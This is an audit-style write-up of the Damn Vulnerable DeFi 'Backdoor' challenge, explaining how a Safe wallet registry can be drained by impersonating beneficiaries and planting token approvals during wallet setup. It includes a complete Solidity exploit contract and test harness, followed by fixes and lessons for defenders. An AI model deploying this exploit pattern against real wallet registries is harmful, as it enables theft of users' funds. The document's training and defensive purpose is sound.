# BACKDOOR — Audit Report

**Protocol:** Damn Vulnerable DeFi<br>
**Challenge:** Backdoor / WalletRegistry<br>
**Time Spent:** 150 minutes<br>
**Status:** Solved
------------------

## Executive Summary

**Vulnerability Found:** The registry trusts the `owners` field supplied in `Safe.setup` and funds a newly-created Safe before verifying the wallet did not perform harmful side effects during initialization (e.g., granting approvals). An attacker can create a wallet that declares a real beneficiary as owner and, during `setup`, make the wallet itself execute a call that grants an allowance to the attacker — the registry then funds the wallet and the attacker drains the funds.

**Severity:** Critical

**Attack Complexity:** Medium

**Impact:** All reward tokens (40 DVT) can be drained from the registry into an attacker-controlled account (or forwarded to a recovery account) in a single transaction.

**Root Cause:** The registry’s trust model: it accepts the owner declared in the `initializer` as proof of entitlement and transfers funds immediately after `setup` completes, but `setup` allows the newly-deployed wallet to execute an arbitrary external call (`to.call(data)`) before the registry funds it. The ordering (setup → registry funding) plus the factory’s openness (anyone can create proxies with arbitrary `initializer`) creates the backdoor.

---

## Challenge Overview

**Objective:** Uncover the vulnerability in the WalletRegistry and rescue all funds, depositing them to the designated recovery account in a single transaction.

**Initial State:**

* Pool balance: 40 DVT (held by `WalletRegistry`)
* Attacker balance: 0 DVT (attacker starts with no challenge funds)
* Relevant contracts:

  * `Safe` (singleton master copy) — Safe smart account implementation
  * `SafeProxyFactory` — deploys Safe proxies and calls `createProxyWithCallback`
  * `WalletRegistry` — callback target that verifies wallets and sends 10 DVT per beneficiary
  * `DamnValuableToken` — ERC20 reward token

**Success Criteria:**

* [ ] All four beneficiaries (Alice, Bob, Charlie, David) have registered wallets recorded in `wallets`.
* [ ] All four beneficiaries are removed from `beneficiaries` mapping.
* [ ] All 40 DVT have been collected into the recovery account.
* [ ] The player executed a single transaction.

---

## Vulnerability Analysis

### Economic Incentive Analysis

**Attack Priority:**

1. **Backdoor via Safe.setup arbitrary call** — Potential profit: 40 DVT, Cost: minimal (gas, single tx).

   * Likelihood: High (given current registry design)
   * Impact: Critical (full fund drain)

2. **Other mitigated paths** — No realistic alternative path required; the `setup` primitive provides a direct route.

### Technical Analysis

**Vulnerable Component:** `WalletRegistry.proxyCreated(...)` / initialization-trust mechanism

**Location:**

* `WalletRegistry.sol` — primary
* `Safe.sol` (setup behavior) — enabling primitive
* `SafeProxyFactory.sol` — creates proxies and triggers callback

**Vulnerability Type:** Arbitrary external call during initialization + trust-of-declared-owner (ledger/authorization abuse)

**Code Review:**

```solidity
function proxyCreated(SafeProxy proxy, address singleton, bytes calldata initializer, uint256) external override {
    if (token.balanceOf(address(this)) < PAYMENT_AMOUNT) { revert NotEnoughFunds(); }

    address payable walletAddress = payable(proxy);

    if (msg.sender != walletFactory) { revert CallerNotFactory(); }
    if (singleton != singletonCopy) { revert FakeSingletonCopy(); }

    if (bytes4(initializer[:4]) != Safe.setup.selector) { revert InvalidInitialization(); }

    uint256 threshold = Safe(walletAddress).getThreshold();
    if (threshold != EXPECTED_THRESHOLD) { revert InvalidThreshold(threshold); }

    address[] memory owners = Safe(walletAddress).getOwners();
    if (owners.length != EXPECTED_OWNERS_COUNT) { revert InvalidOwnersCount(owners.length); }

    // ← registry trusts the declared owner value
    address walletOwner;
    unchecked { walletOwner = owners[0]; }
    if (!beneficiaries[walletOwner]) { revert OwnerIsNotABeneficiary(); }

    // ... then registry funds the wallet
    SafeTransferLib.safeTransfer(address(token), walletAddress, PAYMENT_AMOUNT);
}
```

**Why This Is Exploitable:**

* The factory lets *anyone* create a Safe proxy and pass an arbitrary `initializer` to `setup`.
* `Safe.setup` allows the newly-created wallet to **execute an arbitrary external call** (`to.call(data)`) during initialization; that call is executed as the wallet (`msg.sender == wallet`).
* The registry’s checks only validate the declared `owners` stored in the wallet state. They do **not** verify owner consent (caller vs declared owner) nor do they check for side effects performed during `setup` (e.g., approvals).
* Because `setup` runs *before* the registry funds the wallet and can create an approval, an attacker can set an allowance from the wallet to themselves and then the registry’s subsequent transfer will be withdrawable by `transferFrom`.

**Attack Prerequisites:**

* [ ] Ability to call `SafeProxyFactory.createProxyWithCallback(...)` (anyone can).
* [ ] Knowledge of a beneficiary address (Alice/Bob/Charlie/David).
* [ ] Attacker-supplied `initializer` that sets `owners = [beneficiary]` and uses `to`/`data` to produce a persistent effect (e.g., an ERC20 approval).
* [ ] Attacker must perform creation + drain steps inside a single transaction to satisfy challenge constraints.

---

## Attack Vector

### Step-by-Step Exploit

**Phase 1: Prepare malicious initializer**

1. Construct `initializer = abi.encodeCall(Safe.setup, (owners, 1, to, data, fallback, paymentToken, 0, paymentReceiver))` where:

   * `owners = [a_real_beneficiary_address]`
   * `to` + `data` encode a call that causes the wallet (during setup) to create a persistent effect beneficial to the attacker (e.g., `token.approve(attacker, PAYMENT_AMOUNT)`).

**Phase 2: Create proxy and set approval**
2. Call `SafeProxyFactory.createProxyWithCallback(singletonCopy, initializer, salt, address(walletRegistry))`.

* Factory deploys the `SafeProxy` and executes `proxy.call(initializer)` → this runs `Safe.setup` on the proxy.
* During `setup`, the proxy executes `to.call(data)`; because the proxy is the caller, the token allowance (or other state) is set from the wallet address.

3. The factory calls `walletRegistry.proxyCreated(...)` as callback; the registry validates the declared owner (`owners[0]`) — which is a real beneficiary — and proceeds.

**Phase 3: Registry funds & attacker drains**
4. `WalletRegistry` transfers `PAYMENT_AMOUNT` to the newly-created wallet.
5. The attacker (or attacker-controlled contract) calls `token.transferFrom(wallet, attacker, PAYMENT_AMOUNT)` using the allowance set during `setup`.

**Phase 4: Repeat within single transaction**
6. Repeat the above steps for all beneficiaries inside a single transaction (for example, in a loop inside an attacker contract constructor or a single call), draining each 10 DVT reward. Finalize by forwarding all tokens to the recovery address.

**Phase N: Execute / Withdraw / Finalize**
N. After loop completes, all 40 DVT are collected at the designated recovery account; the player’s on-chain activity is a single transaction.

---

## Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";

interface ISafe {
    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external;
}

interface ISafeProxyFactory {
    function createProxyWithCallback(
        address singleton,
        bytes memory initializer,
        uint256 saltNonce,
        address callback
    ) external returns (SafeProxy proxy);
}

/**
 * @title ApprovalHelper
 * @notice Simple helper that lets a Safe approve tokens to an attacker during setup.
 */
contract ApprovalHelper {
    function approve(IERC20 token, address attacker, uint256 amount) external {
        token.approve(attacker, amount);
    }
}

/**
 * @title BackdoorExploit
 * @notice Exploits WalletRegistry by impersonating beneficiaries and injecting approval backdoor
 * @dev Creates wallets for all beneficiaries with pre-approved tokens, then drains registry
 */
contract BackdoorExploit {
    ISafeProxyFactory public immutable factory;
    address public immutable singleton;
    address public immutable registry;
    IERC20 public immutable token;
    address public immutable recovery;

    ApprovalHelper public immutable approvalHelper;

    uint256 private constant PAYMENT_AMOUNT = 10 ether;

    constructor(
        address _factory,
        address _singleton,
        address _registry,
        address _token,
        address _recovery,
        address[] memory beneficiaries
    ) {
        factory = ISafeProxyFactory(_factory);
        singleton = _singleton;
        registry = _registry;
        token = IERC20(_token);
        recovery = _recovery;

        approvalHelper = new ApprovalHelper();

        for (uint256 i = 0; i < beneficiaries.length; i++) {
            address wallet = _createBackdoorWallet(beneficiaries[i]);
            token.transferFrom(wallet, address(this), PAYMENT_AMOUNT);
            token.transfer(recovery, PAYMENT_AMOUNT);
        }
    }

    /**
     * @notice Creates a Safe wallet whose setup grants an approval to this contract
     * @param beneficiary The legitimate beneficiary being impersonated
     * @return wallet The created Safe proxy address
     */
    function _createBackdoorWallet(address beneficiary)
        private
        returns (address wallet)
    {
        address[] memory owners = new address[](1);
        owners[0] = beneficiary;
        bytes memory approvalData = abi.encodeCall(
            ApprovalHelper.approve,
            (token, address(this), PAYMENT_AMOUNT)
        );
        bytes memory initializer = abi.encodeCall(
            ISafe.setup,
            (
                owners,
                1,
                address(approvalHelper), // wallet will externally call this helper
                approvalData,            // approval logic
                address(0),              // no fallback handler
                address(0),              // no payment token
                0,                       // no payment
                payable(address(0))      // no payment receiver
            )
        );

        SafeProxy proxy = factory.createProxyWithCallback(
            singleton,
            initializer,
            uint256(keccak256(abi.encodePacked(beneficiary, block.timestamp))),
            registry
        );

        wallet = address(proxy);
    }
}

/**
 * @notice Test harness (simulated solution for DamnVulnerableDeFi Backdoor challenge)
 */
function test_backdoor() public checkSolvedByPlayer {
    address[] memory beneficiaries = new address[](4);
    beneficiaries[0] = alice;
    beneficiaries[1] = bob;
    beneficiaries[2] = charlie;
    beneficiaries[3] = david;

    new BackdoorExploit(
        address(walletFactory),
        address(singletonCopy),
        address(walletRegistry),
        address(token),
        recovery,
        beneficiaries
    );

    assertEq(token.balanceOf(address(walletRegistry)), 0, "Registry should be drained");
    assertEq(token.balanceOf(recovery), 40 ether, "All tokens should be in recovery");
    assertEq(walletRegistry.wallets(alice) != address(0), true);
    assertEq(walletRegistry.wallets(bob) != address(0), true);
    assertEq(walletRegistry.wallets(charlie) != address(0), true);
    assertEq(walletRegistry.wallets(david) != address(0), true);
}
```
---

## Recommendations

### Immediate Fixes

**1. Require creator proof of ownership**

```solidity
// BEFORE (vulnerable)
address[] memory owners = Safe(walletAddress).getOwners();
if (!beneficiaries[owners[0]]) revert OwnerIsNotABeneficiary();
// AFTER
// require a signature from owners[0] proving consent, e.g. EIP-712 signed approval
```
*Rationale:* Prevents an attacker from declaring a beneficiary as owner without that beneficiary’s consent.

**2. Verify no dangerous side effects before funding**

*Before transferring funds, add checks such as:*

* Ensure no ERC20 allowances exist from the wallet to unknown addresses.
* Ensure fallback handler or modules are zero / in an allowlist.
* Optionally call out to a verifier contract that inspects a limited set of storage slots for suspicious configuration.

```solidity
require(IERC20(token).allowance(wallet, anyKnownSpender) == 0, "unexpected allowance");
require(_getFallbackManager(wallet) == address(0), "fallback set");
```

**3. Restrict factory creation for registry-funded flows**

*Require that only the beneficiary (or a caller with a valid pre-signed message from the beneficiary) can trigger the registry-funded factory flow; or offer a different factory method specifically for registry registrations with stricter checks.*

**4. Use push-with-claim instead of push-then-trust**

*Instead of pushing tokens into freshly-created wallets, mark the beneficiary as eligible and require the owner to claim funds by calling the registry from an address that proves control (e.g., owner-signed message). This prevents the registry from trusting initializer-supplied state.*

**5. Audit initializers / disallow arbitrary exec in this flow**

*Disallow `to`/`data` in initializers that the registry will fund, or restrict `to` to an allow-list of safe contracts.*

**6. Operational monitoring**

*Add on-chain events and off-chain alerting to detect approvals or unexpected module activation immediately after wallet creation. Rapid detection + response can limit damage even if prevention fails.*

---

## Lessons Learned

### Pattern Identified

**Pattern Name:** `Initialization-Authorization Gap`

**Description:** A design that trusts initialization-provided state (e.g., declared owners) without independent proof of consent, combined with initialization hooks that can execute arbitrary calls, creates a privileged window where the freshly-initialized account can perform actions that persist before the system funds or finalizes the account.

**Where This Appears:**

* Wallet factories + registries that fund fresh wallets (onboarding flow)
* Any push-based reward or grant that relies on initializer-supplied owner assertions
* Airdrop or reward distribution systems validating eligibility from user-supplied proofs
* Any system checking "who you say you are" instead of "who you cryptographically prove to be"

**How to Spot It:**

Red flags:

* Initialization accepts an arbitrary `owners` array and executes `to.call(data)` during `setup`.
* The registry or funder transfers value into a newly-initialized account immediately after `setup` without proving owner consent.
* The factory method can be invoked by any EOA, not restricted to the declared owner (or lacking signed proof).

### Key Takeaways

1. Prefer **proof-based onboarding** (owner-signed registration) over trusting initializer-supplied owner fields.
2. Avoid **push-then-trust** funding flows — prefer claim-based flows or additional pre-fund verification.
3. Monitor initialization side-effects: if initialization can perform an external call, systems that rely on initialization state must treat that as untrusted.

### Real-World Examples

* Gnosis Safe — Delegate call capability during setup is intentional for flexibility but requires careful integration
* Various proxy patterns — Multiple incidents where initialization functions allowed malicious delegate calls
* Airdrop exploits — Claiming tokens on behalf of others by supplying their addresses in calldata (2021-2022)

---

## Metadata

**Tools Used:** Foundry (forge), `vm.recordLogs()` traces, manual code review, local tests
**Pattern Library Entry:** `#initialization-authorization-gap`
**Time Breakdown:**

* 05:15-05:25 — Read challenge & map actors / assets
* 05:25-06:00 — Review WalletRegistry and Safe.setup behavior, hypothesize vector
* 06:00-06:50 — Instrumented tests / traces to validate ordering and side-effects
* 06:50-07:45 — Consolidated analysis, wrote report and remediation suggestions

**Total Time:** 150 minutes

---

*Report generated on [06-11-2025] by [0xUnavailable]*  
*GitHub: [https://github.com/0xUnavailable]*  
*Twitter: [https://x.com/0xUnavailable]*


---
